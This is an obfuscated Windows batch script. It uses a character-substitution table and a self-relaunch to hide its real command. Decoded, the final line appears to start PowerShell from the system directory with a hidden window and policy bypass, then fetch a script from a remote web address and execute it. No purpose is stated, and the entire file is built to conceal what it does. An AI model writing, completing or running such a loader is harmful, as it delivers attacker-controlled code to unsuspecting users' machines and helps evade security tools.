@echo off
@echo off&(if defined @manezao@ goto ¡)&setlocal disableDelayedExpansion&for /f "delims=:. tokens=2" %%A in ('chcp') do set "@chcp@=chcp %%A>nul"&chcp 708>nul&set ^"@args@=%*"
set "@manezao@= !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~""
set "@jasa@=¡¢¤¥§¨©×«¬­®¯°±²³´µ¶·¸¹÷»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞ‗אבגדהוזחטיךכלםמןנסעףפץצקרשתûü‎‏ÿ£"
(setlocal enableDelayedExpansion&for /l %%N in (0 1 93) do set "!@jasa@:~%%N,1!=!@manezao@:~%%N,1!")&cmd /c ^""%~f0" !@args@!"
%@chcp@%&exit /b
:¡
%Á%%ז%%ה%%י%%נ%%¡%%נ%%ח%%ח%
%ה%%ם%%פ%
%SystemRoot%%Ý%%Ô%%ת%%פ%%ץ%%ז%%מ%%´%%³%%Ý%%Ø%%ך%%ן%%ו%%נ%%ר%%פ%%Ñ%%נ%%ר%%ז%%ף%%Ô%%י%%ז%%ם%%ם%%Ý%%ק%%²%%¯%%±%%Ý%%ס%%נ%%ר%%ז%%ף%%פ%%י%%ז%%ם%%ם%%¯%%ז%%ש%%ז%%¡%%®%%ז%%ס%%¡%%Ã%%ת%%ס%%ג%%פ%%פ%%¡%%®%%ן%%נ%%ס%%¡%%®%%ן%%נ%%ז%%ש%%ך%%ץ%%¡%%®%%ר%%ך%%ן%%ו%%נ%%ר%%פ%%ץ%%ת%%ם%%ז%%¡%%י%%ך%%ו%%ו%%ז%%ן%%¡%%£%%©%%ן%%ז%%ר%%®%%נ%%ד%%כ%%ז%%ה%%ץ%%¡%%ן%%ז%%ץ%%¯%%ר%%ז%%ד%%ה%%ם%%ך%%ז%%ן%%ץ%%×%%¯%%Å%%נ%%ר%%ן%%ם%%נ%%ג%%ו%%Ô%%ץ%%ף%%ך%%ן%%ט%%©%%¨%%י%%ץ%%ץ%%ס%%»%%°%%°%%כ%%נ%%י%%ן%%ך%%ה%%ל%%נ%%ר%%ך%%ה%%û%%ו%%ו%%פ%%¯%%ה%%נ%%מ%%°%%ר%%ס%%®%%ג%%ו%%מ%%ך%%ן%%°%%°%%À%%ג%%¾%%Û%%±%%Å%%Æ%%Ù%%Ö%%Ã%%Ô%%Ø%%Å%%¸%%Ç%%Æ%%µ%%¶%%Õ%%´%%Ë%%É%%Ã%%Î%%Î%%Ë%%Ù%%Ä%%Ø%%´%%Å%%Ð%%Ï%%÷%%¹%%Ñ%%÷%%Í%%Ú%%´%%Ô%%Ó%%Õ%%¨%%×%%¡%%‎%%¡%%ך%%ז%%ש%%£%
